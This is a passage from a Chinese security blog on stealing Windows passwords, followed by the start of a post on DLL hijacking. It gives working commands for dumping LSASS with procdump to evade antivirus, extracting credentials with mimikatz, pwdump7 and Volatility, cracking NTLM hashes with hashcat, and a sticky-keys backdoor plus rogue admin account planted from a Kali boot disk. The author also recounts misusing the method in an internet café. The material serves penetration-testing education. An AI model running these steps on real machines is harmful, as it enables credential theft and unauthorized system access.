<h2 id="0x02-利用procdump-amp-mimikatz获取密码"><a href="#0x02-利用procdump-amp-mimikatz获取密码" class="headerlink" title="0x02. 利用procdump &amp; mimikatz获取密码"></a>0x02. 利用procdump &amp; mimikatz获取密码</h2><h4 id="实验环境：-1"><a href="#实验环境：-1" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-1-windows-7"><a href="#emsp-emsp-1-windows-7" class="headerlink" title="&emsp;&emsp;1. windows 7"></a>&emsp;&emsp;1. windows 7</h4><h4 id="emsp-emsp-2-procdump-emsp-download-here"><a href="#emsp-emsp-2-procdump-emsp-download-here" class="headerlink" title="&emsp;&emsp;2. procdump &emsp;// download here"></a>&emsp;&emsp;2. procdump &emsp;// <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="external">download here</a></h4><h4 id="emsp-emsp-3-mimikatz-trunk"><a href="#emsp-emsp-3-mimikatz-trunk" class="headerlink" title="&emsp;&emsp;3. mimikatz_trunk"></a>&emsp;&emsp;3. mimikatz_trunk</h4><h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤:"></a>实验步骤:</h4><h4 id="1-首先用procdump下载LSASS进程的内存，因为procdump是Microsoft-Sysinternals-tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd-）"><a href="#1-首先用procdump下载LSASS进程的内存，因为procdump是Microsoft-Sysinternals-tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd-）" class="headerlink" title="1. 首先用procdump下载LSASS进程的内存，因为procdump是Microsoft Sysinternals tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd ）"></a>1. 首先用procdump下载LSASS进程的内存，因为procdump是Microsoft Sysinternals tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd ）</h4><blockquote>
<p>C:\Users\times0ng\Desktop\Procdump\procdump.exe -accepteula -ma lsass.exe  C:\Users\times0ng\Desktop\lsass.dmp</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418212206_7LasW4_Screenshot.jpeg" alt=""></p>
<h4 id="2-接着用mimikatz打开dmp文件，获取内存中的内容-emsp-（-lsass-dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式-）"><a href="#2-接着用mimikatz打开dmp文件，获取内存中的内容-emsp-（-lsass-dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式-）" class="headerlink" title="2. 接着用mimikatz打开dmp文件，获取内存中的内容 &emsp;// （ lsass.dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式 ）"></a>2. 接着用mimikatz打开dmp文件，获取内存中的内容 &emsp;// （ lsass.dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式 ）</h4><blockquote>
<p>C:\Users\times0ng\Desktop\mimikatz_trunk\x64\mimikatz.exe</p>
<p>sekurlsa::minidump C:\Users\time0sng\Desktop\lsass.dmp</p>
<p>sekurlsa::tspkg</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418212557_gNzdRI_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-利用pwdump7获取密码"><a href="#0x03-利用pwdump7获取密码" class="headerlink" title="0x03. 利用pwdump7获取密码"></a>0x03. 利用<strong>pwdump7</strong>获取密码</h2><p>实验环境：</p>
<h4 id="emsp-emsp-windows-7"><a href="#emsp-emsp-windows-7" class="headerlink" title="&emsp;&emsp;windows 7"></a>&emsp;&emsp;windows 7</h4><h4 id="emsp-emsp-pwdump7-emsp-download-here"><a href="#emsp-emsp-pwdump7-emsp-download-here" class="headerlink" title="&emsp;&emsp;pwdump7 &emsp;// download here"></a>&emsp;&emsp;<strong>pwdump7</strong> &emsp;// <a href="http://passwords.openwall.net/b/pwdump/pwdump7.zip" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-1"><a href="#实验步骤：-1" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-直接用管理员运行cmd，再运行pwdump7-exe"><a href="#1-直接用管理员运行cmd，再运行pwdump7-exe" class="headerlink" title="1. 直接用管理员运行cmd，再运行pwdump7.exe"></a>1. 直接用管理员运行cmd，再运行pwdump7.exe</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419001635_R2mdci_Screenshot.jpeg" alt=""></p>
<h4 id="2-用hashcat直接跑NTLM密码"><a href="#2-用hashcat直接跑NTLM密码" class="headerlink" title="2. 用hashcat直接跑NTLM密码"></a>2. 用hashcat直接跑NTLM密码</h4><blockquote>
<p>hashcat -m 1000 AFC44EE7351D61D00698796DA06B1EBF /usr/share/wordlists/sqlmap.txt –force</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419002119_puCgGq_Screenshot.jpeg" alt=""></p>
<h2 id="0x04-利用虚拟机文件获取密码"><a href="#0x04-利用虚拟机文件获取密码" class="headerlink" title="0x04. 利用虚拟机文件获取密码"></a>0x04. 利用虚拟机文件获取密码</h2><h4 id="关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks-pwdump-等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！"><a href="#关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks-pwdump-等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！" class="headerlink" title="关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks pwdump 等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！"></a>关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：<a href="https://github.com/giMini/PowerMemory" target="_blank" rel="external"><strong>PowerMemory</strong></a>、<a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="external"><strong>quarks pwdump </strong></a>等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！</h4><h4 id="接下来我们将获取Windows-7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生-vmss-和-vmem-文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze-、DumpIt"><a href="#接下来我们将获取Windows-7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生-vmss-和-vmem-文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze-、DumpIt" class="headerlink" title="接下来我们将获取Windows 7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生 .vmss 和 .vmem 文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze 、DumpIt"></a>接下来我们将获取Windows 7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生 <em>.vmss 和 </em>.vmem 文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：<a href="https://www.fireeye.com/services/freeware/memoryze.html" target="_blank" rel="external">Memoryze</a> 、<a href="http://qpdownload.com/dumpit/" target="_blank" rel="external">DumpIt</a></h4><h4 id="实验环境：-2"><a href="#实验环境：-2" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-7-挂起状态"><a href="#emsp-emsp-windows-7-挂起状态" class="headerlink" title="&emsp;&emsp;windows 7 挂起状态"></a>&emsp;&emsp;windows 7 挂起状态</h4><h4 id="emsp-emsp-Vmss2core-emsp-download-here"><a href="#emsp-emsp-Vmss2core-emsp-download-here" class="headerlink" title="&emsp;&emsp;Vmss2core &emsp;// download here"></a>&emsp;&emsp;Vmss2core &emsp;// <a href="https://labs.vmware.com/flings/vmss2core#summary" target="_blank" rel="external">download here</a></h4><h4 id="emsp-emsp-Volatility-emsp-download-here"><a href="#emsp-emsp-Volatility-emsp-download-here" class="headerlink" title="&emsp;&emsp;Volatility  &emsp; // download here"></a>&emsp;&emsp;Volatility  &emsp; // <a href="http://www.volatilityfoundation.org/26" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-2"><a href="#实验步骤：-2" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-运行Vmss2core解析虚拟机文件，生成memory-dmp文件"><a href="#1-运行Vmss2core解析虚拟机文件，生成memory-dmp文件" class="headerlink" title="1. 运行Vmss2core解析虚拟机文件，生成memory.dmp文件"></a>1. 运行Vmss2core解析虚拟机文件，生成memory.dmp文件</h4><blockquote>
<p>./vmss2core-mac64 -W /Users/apple1/Documents/Virtual\ Machines.localized/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64-89925192.vmss /Users/apple1/Documents/Virtual\ Machines.localized/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64-89925192.vmem </p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419111752_6vqNIx_Screenshot.jpeg" alt=""></p>
<h4 id="2-利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，-profile-Win7SP1x64-架构一定要指定正确，不然会找不到地址"><a href="#2-利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，-profile-Win7SP1x64-架构一定要指定正确，不然会找不到地址" class="headerlink" title="2. 利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，--profile=Win7SP1x64 架构一定要指定正确，不然会找不到地址"></a>2. 利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，<strong>-</strong>-profile=Win7SP1x64 架构一定要指定正确，不然会找不到地址</h4><blockquote>
<p>./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone hivelist -f memory.dmp –profile=Win7SP1x64</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419110839_6RL5dK_Screenshot.jpeg" alt=""></p>
<h4 id="3-接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML-hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！"><a href="#3-接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML-hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！" class="headerlink" title="3. 接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！"></a>3. 接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！</h4><blockquote>
<p>./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone hashdump -f memory.dmp –profile=Win7SP1x64 sys-offset=0xfffff8a000024010 sam-offset=0xfffff8a000b33010</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419111612_Tkq2jz_Screenshot.jpeg" alt=""></p>
<h2 id="0x05-利用kali-ISO获取密码"><a href="#0x05-利用kali-ISO获取密码" class="headerlink" title="0x05. 利用kali ISO获取密码"></a>0x05. 利用kali ISO获取密码</h2><h4 id="这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。"><a href="#这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。" class="headerlink" title="这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。"></a>这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。</h4><h4 id="在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。"><a href="#在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。" class="headerlink" title="在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。"></a>在开始之前我们应该先准备一个USB启动盘，制作方法可以看我<a href="https://times0ng.github.io/2018/03/01/kali安装KVM入坑笔记/">以前的文章</a>，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。</h4><h4 id="实验环境：-3"><a href="#实验环境：-3" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-10"><a href="#emsp-emsp-windows-10" class="headerlink" title="&emsp;&emsp;windows 10"></a>&emsp;&emsp;windows 10</h4><h4 id="emsp-emsp-kali-ISO-emsp-download-here"><a href="#emsp-emsp-kali-ISO-emsp-download-here" class="headerlink" title="&emsp;&emsp;kali ISO &emsp;// download here"></a>&emsp;&emsp;kali ISO &emsp;// <a href="https://www.kali.org/downloads/" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-3"><a href="#实验步骤：-3" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-首先将kali-ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前-）"><a href="#1-首先将kali-ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前-）" class="headerlink" title="1. 首先将kali ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前 ）"></a>1. 首先将kali ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前 ）</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419184849_OuzqV7_Screenshot.jpeg" alt=""></p>
<h4 id="2-然后启动win10就会进入kali的引导界面，我们点击Live-amd-64-即可"><a href="#2-然后启动win10就会进入kali的引导界面，我们点击Live-amd-64-即可" class="headerlink" title="2. 然后启动win10就会进入kali的引导界面，我们点击Live (amd 64) 即可"></a>2. 然后启动win10就会进入kali的引导界面，我们点击Live (amd 64) 即可</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419185050_jKbLW5_Screenshot.jpeg" alt=""></p>
<h4 id="3-进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到-mnt-目录下，之后对-mnt目录下的操作就相当于对win10进行操作了"><a href="#3-进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到-mnt-目录下，之后对-mnt目录下的操作就相当于对win10进行操作了" class="headerlink" title="3. 进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到 /mnt 目录下，之后对/mnt目录下的操作就相当于对win10进行操作了"></a>3. 进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到 /mnt 目录下，之后对/mnt目录下的操作就相当于对win10进行操作了</h4><blockquote>
<p>fdisk -l &amp;&amp; mount /dev/sda2 /mnt &amp;&amp; cd /mnt/ </p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419185436_ohOVSp_Screenshot.jpeg" alt=""></p>
<h4 id="4-挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】"><a href="#4-挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】" class="headerlink" title="4. 挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】"></a>4. 挂载完之后我们先盗取账号密码【Win10果然更安全了，居然显示是空密码，这显然不是我们要的结果，第二张图附上Win7的效果图】</h4><blockquote>
<p>cd /mnt/Windows/System32/config/ &amp;&amp; samdump2 SYSTEM SAM</p>
<p>hashcat -m 1000 afc44ee7351d61d00698796da06b1ebf /usr/share/wordlists/sqlmap.txt <strong>-</strong>-force</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180420121521_8LVsuZ_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419190846_DSIMrd_Screenshot.jpeg" alt=""></p>
<h4 id="5-虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows-提权基础-讲漏了，这里补上"><a href="#5-虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows-提权基础-讲漏了，这里补上" class="headerlink" title="5. 虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇Windows 提权基础 讲漏了，这里补上"></a>5. 虽然win10密码安全性加强了，但并不阻碍我们进行别的操作，下面我们使用经典的shift提权技术来完成进一步操作，上一篇<a href="https://times0ng.github.io/2018/04/13/Windows-提权基础（下）/">Windows 提权基础</a> 讲漏了，这里补上</h4><blockquote>
<p>cd /mnt/Windows/System32/</p>
<p>cp cmd.exe sethc.exe</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419192009_pBbNtJ_Screenshot.jpeg" alt=""></p>
<h4 id="6-OK-现在需要做的就是关闭kali-，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行"><a href="#6-OK-现在需要做的就是关闭kali-，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行" class="headerlink" title="6. OK 现在需要做的就是关闭kali ，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行"></a>6. OK 现在需要做的就是关闭kali ，将映射到win10的ISO移除，然后启动win10，可以看到登录界面，此时我们连续快速的多次按shift键就能弹出命令行</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419193253_crhGWM_Screenshot.jpeg" alt=""></p>
<h4 id="7-我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼"><a href="#7-我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼" class="headerlink" title="7. 我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼"></a>7. 我们的权限这么大，想必添加个管理员账号什么的也不成问题，下面我添加个test管理员账号，然后登录，一进去就碰到win10给我各种Hi，看得我一脸懵逼</h4><blockquote>
<p>net user test test /add</p>
<p>net localgroup administrators /add test</p>
<p>logoff</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419195550_4l4ZGP_Screenshot.jpeg" alt=""></p>
<h4 id="8-刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】"><a href="#8-刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】" class="headerlink" title="8. 刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】"></a>8. 刚才我们没能抓到win10的hash，但是如果我们仍然想登录times0ng账号的话可以先用命令行修改密码，然后再登陆。【很尴尬，自己的ID都敲错了】</h4><blockquote>
<p>net user time0sng toor</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419200844_4N3J4b_Screenshot.jpeg" alt=""></p>
<h2 id="0x06-结语"><a href="#0x06-结语" class="headerlink" title="0x06. 结语"></a>0x06. 结语</h2><h4 id="希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号：-001-即可获取百度云链接和解压密码。"><a href="#希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号：-001-即可获取百度云链接和解压密码。" class="headerlink" title="希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号： 001 即可获取百度云链接和解压密码。"></a>希望大家喜欢我自制的Windows系列教程，后续我将给大家带来更多更有趣的技巧！如果对上述操作步骤不是很懂或者想看一下视屏演示的读者，可以观看我自制的视屏教程，一元观看就当对笔者劳动的支持吧！大家在信安之路公众号后台回复本视频编号： 001 即可获取百度云链接和解压密码。</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 前言&quot;&gt;&lt;/a&gt;0x00. 前言&lt;/h2&gt;&lt;h4 id=&quot;渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。&quot;&gt;&lt;a href=&quot;#渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。&quot; class=&quot;headerlink&quot; title=&quot;渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。&quot;&gt;&lt;/a&gt;渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Windows 提权基础（下）</title>
    <link href="http://TimeS0ng.github.io/2018/04/13/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>http://TimeS0ng.github.io/2018/04/13/Windows-提权基础（下）/</id>
    <published>2018-04-13T09:13:28.000Z</published>
    <updated>2018-12-18T15:35:53.486Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！"><a href="#今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！" class="headerlink" title="今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！"></a>今天给大家讲一讲我自己的骚姿势，虽然技术内容都不是我自己发明的，但是我将几种技术杂糅在一起之后居然产生了让我自己都感到惊讶的效果！！</h4><a id="more"></a>
<h2 id="0x01-DLL-劫持原理"><a href="#0x01-DLL-劫持原理" class="headerlink" title="0x01. DLL 劫持原理"></a>0x01. DLL 劫持原理</h2><h4 id="原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL-文件，Windows-中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell-的权限也就是该程序所拥有的权限。"><a href="#原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL-文件，Windows-中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell-的权限也就是该程序所拥有的权限。" class="headerlink" title="原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL 文件，Windows 中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell 的权限也就是该程序所拥有的权限。"></a>原理：程序通常不能靠自己自动运行，它们往往需要调用许多资源（主要是DLL 文件，Windows 中的动态链接库）。如果程序或者服务从一个我们拥有写权限的目录里加载文件时，我们就能够利用这一点来弹shell，当然这个shell 的权限也就是该程序所拥有的权限。</h4><h4 id="原理：通常来说Windows-程序会使用一个预定义搜索路径去寻找DLL-文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL-文件放到其中一个路径下，并保证该恶意DLL-先于合法的DLL-被程序找到时就会发生DLL-劫持；也可能是程序寻找的DLL-文件名在系统中并不存在，这时我们只需将自己定制的DLL-文件放到程序的搜索路径也可以达到目的"><a href="#原理：通常来说Windows-程序会使用一个预定义搜索路径去寻找DLL-文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL-文件放到其中一个路径下，并保证该恶意DLL-先于合法的DLL-被程序找到时就会发生DLL-劫持；也可能是程序寻找的DLL-文件名在系统中并不存在，这时我们只需将自己定制的DLL-文件放到程序的搜索路径也可以达到目的" class="headerlink" title="原理：通常来说Windows 程序会使用一个预定义搜索路径去寻找DLL 文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL 文件放到其中一个路径下，并保证该恶意DLL 先于合法的DLL 被程序找到时就会发生DLL 劫持；也可能是程序寻找的DLL 文件名在系统中并不存在，这时我们只需将自己定制的DLL 文件放到程序的搜索路径也可以达到目的"></a>原理：通常来说Windows 程序会使用一个预定义搜索路径去寻找DLL 文件，并且会按照特定的顺序来检索这些路径。当将恶意的DLL 文件放到其中一个路径下，并保证该恶意DLL 先于合法的DLL 被程序找到时就会发生DLL 劫持；也可能是程序寻找的DLL 文件名在系统中并不存在，这时我们只需将自己定制的DLL 文件放到程序的搜索路径也可以达到目的</h4><h4 id="下面你可以看到在一个32-位系统中DLL-的搜索顺序："><a href="#下面你可以看到在一个32-位系统中DLL-的搜索顺序：" class="headerlink" title="下面你可以看到在一个32 位系统中DLL 的搜索顺序："></a>下面你可以看到在一个32 位系统中DLL 的搜索顺序：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1 - The directory from which the application loaded</div><div class="line">2 - 32-bit System directory (C:\Windows\System32)</div><div class="line">3 - 16-bit System directory (C:\Windows\System)</div><div class="line">4 - Windows directory (C:\Windows)</div><div class="line">5 - The current working directory (CWD)</div><div class="line">6 - Directories in the PATH environment variable (system then user)</div></pre></td></tr></table></figure>
